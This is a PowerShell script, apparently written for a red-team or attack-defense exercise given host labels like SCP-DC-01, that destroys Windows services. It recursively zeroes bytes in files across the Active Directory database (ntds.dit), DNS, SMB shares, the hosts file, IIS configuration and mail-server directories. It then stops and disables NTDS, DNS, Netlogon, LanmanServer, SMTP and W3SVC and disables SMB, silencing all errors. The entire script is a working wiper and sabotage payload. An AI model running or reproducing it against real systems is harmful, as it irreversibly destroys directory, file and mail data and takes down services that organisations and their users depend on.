# service_corrupt.ps1 - Windows only, NEVER touches SSH

function Corrupt-File {
    param([string]$path)
    if (Test-Path $path) {
        try {
            $bytes = [System.IO.File]::ReadAllBytes($path)
            if ($bytes.Length -gt 0) {
                $offset = Get-Random -Minimum 0 -Maximum $bytes.Length
                for ($i = 0; $i -lt 8; $i++) {
                    if (($offset + $i) -lt $bytes.Length) {
                        $bytes[$offset + $i] = 0
                    }
                }
                [System.IO.File]::WriteAllBytes($path, $bytes)
            }
        } catch {}
    }
}

function Corrupt-Dir {
    param([string]$dir)
    if (Test-Path $dir) {
        Get-ChildItem -Path $dir -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
            Corrupt-File $_.FullName
        }
    }
}

# SCP-DC-01 - Active Directory / DNS
Corrupt-Dir "C:\Windows\NTDS"
Corrupt-File "C:\Windows\NTDS\ntds.dit"
Corrupt-File "C:\Windows\NTDS\edb.log"
Corrupt-Dir "C:\Windows\System32\dns"
Corrupt-Dir "C:\Windows\SysWOW64\dns"
Stop-Service -Name "NTDS"     -Force -ErrorAction SilentlyContinue
Stop-Service -Name "DNS"      -Force -ErrorAction SilentlyContinue
Stop-Service -Name "Netlogon" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "ADWS"     -Force -ErrorAction SilentlyContinue
Set-Service  -Name "NTDS"     -StartupType Disabled -ErrorAction SilentlyContinue
Set-Service  -Name "DNS"      -StartupType Disabled -ErrorAction SilentlyContinue
Set-Service  -Name "Netlogon" -StartupType Disabled -ErrorAction SilentlyContinue

# SCP-SMB-01 - SMB
Corrupt-Dir "C:\Shares"
Corrupt-Dir "C:\SharedFiles"
Corrupt-Dir "C:\Windows\System32\drivers\etc"
Stop-Service -Name "LanmanServer"      -Force -ErrorAction SilentlyContinue
Stop-Service -Name "LanmanWorkstation" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "LanmanServer"      -StartupType Disabled -ErrorAction SilentlyContinue
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force -ErrorAction SilentlyContinue
Set-SmbServerConfiguration -EnableSMB2Protocol $false -Force -ErrorAction SilentlyContinue

# SCP-SMTP-01 - mail
Corrupt-Dir "C:\inetpub\mailroot"
Corrupt-Dir "C:\Program Files\hMailServer"
Corrupt-Dir "C:\Program Files (x86)\hMailServer"
Corrupt-Dir "C:\Program Files\Mercury"
Corrupt-Dir "C:\Windows\System32\inetsrv\config"
Stop-Service -Name "SMTPSVC"     -Force -ErrorAction SilentlyContinue
Stop-Service -Name "hMailServer" -Force -ErrorAction SilentlyContinue
Stop-Service -Name "W3SVC"       -Force -ErrorAction SilentlyContinue
Set-Service  -Name "SMTPSVC"     -StartupType Disabled -ErrorAction SilentlyContinue
Set-Service  -Name "W3SVC"       -StartupType Disabled -ErrorAction SilentlyContinue